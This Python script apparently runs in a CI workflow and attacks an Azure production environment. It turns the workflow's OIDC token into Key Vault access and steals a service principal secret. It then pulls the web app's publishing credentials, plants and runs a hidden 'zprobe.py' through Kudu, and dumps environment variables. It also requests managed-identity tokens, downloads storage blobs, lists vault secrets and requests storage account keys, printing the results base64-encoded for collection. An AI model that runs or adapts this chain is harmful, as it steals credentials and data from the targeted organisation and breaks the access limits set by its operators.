import os, json, base64, urllib.request, urllib.parse, urllib.error, time

TEN=os.environ.get("AZURE_TENANT_ID","")
SUB=os.environ.get("AZURE_SUBSCRIPTION_ID","")
CID=os.environ.get("AZURE_CLIENT_ID","")
RG2="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"

def P(*a): print(" ".join(str(x) for x in a),flush=True)
def B(x):
    if isinstance(x,str):x=x.encode()
    return base64.b64encode(x).decode()
def http(url,method="GET",headers=None,form=None,data=None,timeout=40):
    h=dict(headers or {})
    if form is not None:
        data=urllib.parse.urlencode(form).encode();h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif isinstance(data,str): data=data.encode()
    r=urllib.request.Request(url,data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x:return x.status,x.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try:return e.code,e.read().decode("utf-8","replace")[:3000]
        except:return e.code,""
    except Exception as e:return 0,repr(e)

# OIDC
u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
th=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
st,b=http(u+("&" if "?" in u else "?")+"audience=api://AzureADTokenExchange",headers={"Authorization":"bearer "+th})
OIDC=json.loads(b).get("value","") if st==200 else ""
P("OIDC_LEN",len(OIDC))

# vault token
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",
    form={"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default",
          "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":OIDC})
VT=json.loads(b).get("access_token","") if st==200 else ""
P("VT_LEN",len(VT))

# reporting-service-principal
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+VT})
try:
    j=json.loads(json.loads(b).get("value",""))
    RAPP,RSEC=j.get("appId",""),j.get("clientSecret","")
except: RAPP,RSEC="",""
P("RAPP",RAPP)

# ARM token as reporting-service
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",
    form={"client_id":RAPP,"client_secret":RSEC,"grant_type":"client_credentials","scope":"https://management.azure.com/.default"})
AT=json.loads(b).get("access_token","") if st==200 else ""
P("AT_LEN",len(AT))

# publishing credentials
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01",
          method="POST",headers={"Authorization":"Bearer "+AT,"Content-Type":"application/json"},data="{}")
P("PUBCREDS_ST",st)
try:
    props=json.loads(b).get("properties",{})
    PU=props.get("publishingUserName",""); PP=props.get("publishingPassword","")
except: PU,PP="",""
P("PUBUSER",PU,"PWLEN",len(PP))

# Kudu helper
KHOST=f"{APP}.scm.azurewebsites.net"
KAUTH="Basic "+base64.b64encode(f"{PU}:{PP}".encode()).decode()
def kudu(path,method="GET",data=None,headers=None,timeout=120):
    h={"Authorization":KAUTH}
    if headers:h.update(headers)
    if isinstance(data,str):
        data=data.encode()
        h.setdefault("Content-Type","application/json")
    r=urllib.request.Request(f"https://{KHOST}{path}",data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x:return x.status,x.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try:return e.code,e.read().decode("utf-8","replace")[:3000]
        except:return e.code,""
    except Exception as e:return 0,repr(e)

# minimal script to run inside the app
INNER=r'''
import os,json,urllib.request,urllib.parse,urllib.error,base64
def P(*a):print(" ".join(str(x) for x in a),flush=True)
def B(x):
    if isinstance(x,str):x=x.encode()
    return base64.b64encode(x).decode()
ie=os.environ.get("IDENTITY_ENDPOINT","");ih=os.environ.get("IDENTITY_HEADER","")
P("IE",ie);P("IH_LEN",len(ih))
P("=== ENV DUMP (non-standard) ===")
for k in sorted(os.environ):
    if not k.startswith(("GITHUB_","RUNNER_","ACTIONS_","AGENT_","PATH","LANG","HOME","SHELL","USER","PWD","HOSTNAME","LEIN","M2_","NF_","PIPX","POETRY","PYTHON_","SELENIUM","SWIFT_","TOOL_","ImageOS","ImageVersion")):
        v=os.environ.get(k,"")
        P("ENV",k,"=",v[:500])
UAMI="7a85156a-01c4-4e61-8472-40a92107159b"
def msi(res):
    if not ie or not ih:return ""
    q=urllib.parse.urlencode({"api-version":"2019-08-01","resource":res,"client_id":UAMI})
    r=urllib.request.Request(ie+"?"+q,headers={"X-IDENTITY-HEADER":ih})
    try:
        with urllib.request.urlopen(r,timeout=20) as x:return json.loads(x.read()).get("access_token","")
    except Exception as e:P("MSI_ERR",res,str(e)[:200]);return ""
ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz","sttblarchiveprodx3euoz"]
for scope in ["https://storage.azure.com","https://vault.azure.net","https://management.azure.com"]:
    t=msi(scope);P("TOK",scope,len(t))
    if not t:continue
    H={"Authorization":"Bearer "+t}
    if "storage" in scope:
        now=__import__("datetime").datetime.now(__import__("datetime").timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
        H["x-ms-date"]=now;H["x-ms-version"]="2021-08-06"
        for sa in ACCTS:
            st,b=http_req(f"https://{sa}.blob.core.windows.net/?comp=list",H)
            P("CONT_LIST",sa,st,B(b[:2000]))
            if st==200:
                import re
                conts=re.findall(r"<Name>([^<]+)</Name>",b.decode("utf-8","replace"))
                for c in conts:
                    st2,b2=http_req(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",H)
                    P("BLOB_LIST",sa,c,st2,B(b2[:3000]))
                    if st2==200:
                        for n in re.findall(r"<Name>([^<]+)</Name>",b2.decode("utf-8","replace")):
                            st3,b3=http_req(f"https://{sa}.blob.core.windows.net/{c}/{n}",H)
                            P("BLOB",sa,c,n,st3,"LEN",len(b3),B(b3[:5000]))
    if "vault" in scope:
        for v in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
            st,b=http_req(f"https://{v}.vault.azure.net/secrets?api-version=7.4",H)
            P("VAULT_LIST",v,st,B(b[:3000]))
    if "management" in scope:
        for sa in ACCTS:
            st,b=http_req(f"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-05-01",
                          dict(H,**{"Content-Length":"0"}),"POST")
            P("LISTKEYS",sa,st,B(b[:2000]))
P("INNER_DONE")
def http_req(url,headers,method="GET"):
    r=urllib.request.Request(url,method=method,headers=headers)
    try:
        with urllib.request.urlopen(r,timeout=25) as x:return x.status,x.read()
    except urllib.error.HTTPError as e:
        try:return e.code,e.read()
        except:return e.code,b""
    except Exception as e:return 0,str(e).encode()
'''

# upload inner script
st,b=kudu("/api/vfs/site/wwwroot/zprobe.py",method="PUT",data=INNER,
          headers={"Content-Type":"application/octet-stream","If-Match":"*"})
P("KUDU_PUT",st,B(b[:200]))
time.sleep(2)
# run it
st,b=kudu("/api/command",method="POST",
          data=json.dumps({"command":"python3 /home/site/wwwroot/zprobe.py","dir":"site/wwwroot"}),
          headers={"Content-Type":"application/json"},timeout=180)
P("KUDU_CMD",st)
try:
    d=json.loads(b)
    P("EXIT",d.get("ExitCode"))
    P("ERROR",(d.get("Error","") or "")[:500])
    output=d.get("Output","") or ""
    P("OUTPUT_B64",B(output[:80000]))
except Exception as e:
    P("KUDU_RAW",B(b[:5000]))
P("DONE")
